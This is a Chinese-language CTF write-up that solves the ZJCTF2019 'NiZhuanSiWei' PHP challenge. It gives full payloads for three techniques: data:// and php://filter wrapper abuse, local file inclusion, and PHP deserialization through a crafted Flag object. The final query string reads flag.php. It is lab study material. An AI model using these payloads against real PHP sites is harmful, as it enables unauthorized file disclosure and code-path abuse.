---
title: ZJCTF2019-NiZhuanSiWei1
date: 2025-03-13 20:39:05
tags:
- 文件包含
category:
- 刷题笔记
---

# ZJCTF2019-NiZhuanSiWei1

1、启动靶机并访问，上来就是一串源码

```
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

2、这里很明显了,include($file)，说明是一道文件包含题，而且提示我们包含`useless.php`。

**3、php代码审计，我们这里必须让file_get_contents($text,'r')之后的内容为"welcome to the zjctf"，这里可以 利用php伪协议中的data协议，payload为text=data://text/plain,welcome to the zjctf**

**file_get_contents($text,'r')的时候，$text=c会被当做url处理，而读取到的内容就是逗号后面的输入**

```
?text=data://text/plain,welcome to the zjctf&file=useless.php
```

4、发现页面显示welcome to the zjctf，说明我们成功包含了useless.php，但是没有显示flag，因为include直接包含php文件会执行其中代码，所以这里还要用filter伪协议进行base64加密后读取

输入

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php
```

5、得到一串加密后的字符串

```
PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
```

base64解密后即可得到几行php代码，并没有拿到flag，还得继续

```
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

```

6、又要代码审计了，发现这是一个Flag类，然后很明显我们要利用其中的__toString魔术方法来得到flag，但是需要反序列化漏洞来触发，这时回想到了一开始的代码里我们没有用到的password传参，发现这里会对$password进行反序列化，然后ehco输出，正好可以触发\_\_toString魔术方法，所以我们只要构造正确的反序列化字符串即可拿到flag

```
 include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
```

7、构造反序列化字符串

```
<?php

class Flag{  //flag.php
    public $file = 'flag.php';

}

$a = new Flag();
echo serialize($a);
?>

得到
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

8、结合前面的payload即可拿到flag

最后的payload

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

然后查看源代码即可拿到flag
```

注意：这里对useless.php就不需要使用伪协议了，因为我们这里需要它被包含并执行其中的代码，才能通过反序列化漏洞得到flag





